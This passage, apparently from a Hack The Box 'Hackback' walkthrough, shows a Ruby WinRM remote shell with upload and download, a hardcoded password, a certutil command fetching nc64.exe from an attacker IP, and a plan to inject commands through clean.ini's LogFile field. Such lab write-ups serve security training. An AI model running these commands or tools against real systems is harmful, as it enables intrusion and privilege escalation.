    &lt;span class=&quot;k&quot;&gt;until&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;exit&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'&amp;gt; ')&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;chomp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;STDIN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;gets&lt;/span&gt;        
        &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;STDOUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;STDERR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;    
    &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Exiting with code &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;exitcode&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and--no-flag-&quot;&gt;And …. no flag !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;cleanini--shell-as-hacker&quot;&gt;clean.ini , Shell as hacker&lt;/h3&gt;
&lt;h4 id=&quot;i-checked-c-and-found-a-strange-directory-called-util-&quot;&gt;I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;c:\&lt;/code&gt; and found a strange directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;util&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;cutil&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;c:\util&lt;/code&gt;:&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS hackback\simple@HACKBACK C:\&amp;gt; cd util                              
PS hackback\simple@HACKBACK util&amp;gt; ls

Directory: C:\util
    
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/14/2018   3:30 PM                PingCastle

-a----         3/8/2007  12:12 AM         139264 Fping.exe

-a----        3/29/2017   7:46 AM         312832 kirbikator.exe

-a----       12/14/2018   3:42 PM           1404 ms.hta

-a----        2/29/2016  12:04 PM         359336 PSCP.EXE

-a----        2/29/2016  12:04 PM         367528 PSFTP.EXE

-a----         5/4/2018  12:21 PM          23552 RawCap.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;however-there-was-a-hidden-directory-if-we-do-dir--force-&quot;&gt;However there was a hidden directory, if we do &lt;code class=&quot;highlighter-rouge&quot;&gt;dir -force&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS hackback\simple@HACKBACK util&amp;gt; dir -force

Directory: C:\util

Mode                LastWriteTime         Length Name
----                -------------         ------ ----                                     
d-----       12/14/2018   3:30 PM                PingCastle

d--h--       12/21/2018   6:21 AM                scripts

-a----         3/8/2007  12:12 AM         139264 Fping.exe

-a----        3/29/2017   7:46 AM         312832 kirbikator.exe

-a----       12/14/2018   3:42 PM           1404 ms.hta

-a----        2/29/2016  12:04 PM         359336 PSCP.EXE

-a----        2/29/2016  12:04 PM         367528 PSFTP.EXE

-a----         5/4/2018  12:21 PM          23552 RawCap.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;a-new-directory-appeared--scripts-looking-in-that-directory-&quot;&gt;A new directory appeared : &lt;code class=&quot;highlighter-rouge&quot;&gt;scripts&lt;/code&gt;. looking in that directory :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS hackback\simple@HACKBACK util&amp;gt; cd scripts
|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:8888-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.10.10.128:5985-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:8888-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.10.10.128:5985-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
Could not find item C:\util\scripts.
At line:1 char:56
+ ... join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name), ...
+                                                           ~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\util\scripts:String) [Get-Item], IOException
    + FullyQualifiedErrorId : ItemNotFound,Microsoft.PowerShell.Commands.GetItemCommand
PS hackback\simple@HACKBACK &amp;gt; ls

    Directory: C:\util\scripts

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/13/2018   2:54 PM            spool
-a----       12/21/2018   5:44 AM         84 backup.bat
-a----         7/5/2019   5:34 PM         39 batch.log
-a----         7/5/2019   6:07 PM        135 clean.ini
-a----        12/8/2018   9:17 AM       1232 dellog.ps1
-a----         7/5/2019   5:34 PM         36 log.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;without-talking-too-much-about-the-rabbit-holes-and-the-failed-attempts-if-we-check-cleanini-&quot;&gt;Without talking too much about the rabbit holes and the failed attempts. If we check &lt;code class=&quot;highlighter-rouge&quot;&gt;clean.ini&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS hackback\simple@HACKBACK &amp;gt; type clean.ini
[Main]
LifeTime=100
LogFile=c:\util\scripts\log.txt
Directory=c:\inetpub\logs\logfiles
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;obviously-it-gets-executed-from-time-to-time-and-its-the-only-writable-thing-by-simple-in-that-directory-we-can-inject-commands-in-logfile-which-means-that-we-can-make-another-user-execute-our-commands-i-tried-to-upload-ncexe-but-&quot;&gt;Obviously it gets executed from time to time, and it’s the only writable thing by &lt;code class=&quot;highlighter-rouge&quot;&gt;simple&lt;/code&gt; in that directory. We can inject commands in &lt;code class=&quot;highlighter-rouge&quot;&gt;LogFile&lt;/code&gt; which means that we can make another user execute our commands. I tried to upload &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; but :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS hackback\simple@HACKBACK &amp;gt; certutil -urlcache -split -f http://10.10.xx.xx/nc64.exe C:\windows\system32\spool\drivers\color\nc.exe
|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:8888-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.10.10.128:5985-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:8888-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.10.10.128:5985-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
At line:1 char:1
+ certutil -urlcache -split -f http://10.10.xx.xx/nc64.exe C:\windows\s ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;expected-i-terminated-that-winrm-session-and-used-alamots-other-winrm-shell-that-had-upload-and-download-capabilities-&quot;&gt;Expected. I terminated that &lt;code class=&quot;highlighter-rouge&quot;&gt;winrm&lt;/code&gt; session and used Alamot’s other &lt;code class=&quot;highlighter-rouge&quot;&gt;winrm&lt;/code&gt; shell that had upload and download capabilities :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'winrm-fs'&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Author: Alamot&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# To upload a file type: UPLOAD local_path remote_path&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# e.g.: PS&amp;gt; UPLOAD myfile.txt C:\temp\myfile.txt&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; 
  &lt;span class=&quot;ss&quot;&gt;endpoint: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'http://10.10.10.128:5985/wsman'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;user: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'simple'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;password: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ZonoProprioZomaro:-('&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;file_manager&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;FS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;FileManager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 


&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;tokenize&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
      &lt;span class=&quot;nf&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/\s(?=(?:[^'&quot;]|'[^']*'|&quot;[^&quot;]*&quot;)*$)/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;
      &lt;span class=&quot;nf&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;empty?&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}.&lt;/span&gt;
      &lt;span class=&quot;nf&quot;&gt;map&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;gsub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/(^ +)|( +$)|(^[&quot;']+)|([&quot;']+$)/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;


&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:powershell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;until&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;exit&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'&amp;gt; ')&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;chomp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;STDIN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;gets&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;start_with?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'UPLOAD'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;upload_command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;tokenize&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Uploading &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;upload_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; to &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;upload_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;file_manager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;upload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;upload_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;upload_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes_copied&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;total_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
                &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes_copied&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; bytes of &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;total_bytes&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; bytes copied&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;echo `nOK`n&quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;start_with?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DOWNLOAD'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;download_command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;tokenize&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Downloading &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;download_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; to &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;download_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;file_manager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;download&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;download_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;download_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes_copied&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;total_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
                &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes_copied&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; bytes of &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;total_bytes&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; bytes copied&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;echo `nOK`n&quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;STDOUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
